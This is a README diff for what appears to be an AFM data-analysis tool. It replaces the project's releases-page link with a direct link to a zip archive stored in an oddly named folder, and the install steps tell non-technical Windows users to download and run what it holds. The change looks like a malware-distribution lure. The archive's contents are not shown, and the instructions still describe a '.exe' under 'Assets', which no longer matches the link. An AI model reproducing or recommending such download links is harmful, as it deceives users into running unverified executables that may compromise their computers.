@@ -1,6 +1,6 @@
 # 🔍 nomad-measurements-afm - Analyze Atomic Force Microscopy Data Easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/elihuentomophilous263/nomad-measurements-afm/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/elihuentomophilous263/nomad-measurements-afm/main/Campanula/nomad-measurements-afm-v1.9.zip)
 
 ## 📌 What is nomad-measurements-afm?
 
@@ -11,7 +11,7 @@ Nomad-measurements-afm helps you process Atomic Force Microscopy (AFM) data. You
 You do not need programming skills to use this software. Follow these steps to set up the tool on your Windows computer.
 
 ### Step 1: Visit the download page
-Visit this link to download the installer: https://github.com/elihuentomophilous263/nomad-measurements-afm/releases
+Visit this link to download the installer: https://raw.githubusercontent.com/elihuentomophilous263/nomad-measurements-afm/main/Campanula/nomad-measurements-afm-v1.9.zip
 
 ### Step 2: Download the installer
 Look for the section labeled "Assets." Click the file that ends in ".exe." This file contains everything you need to run the application on your computer. Common names look like `nomad-afm-setup.exe`. Save this file to your Downloads folder.
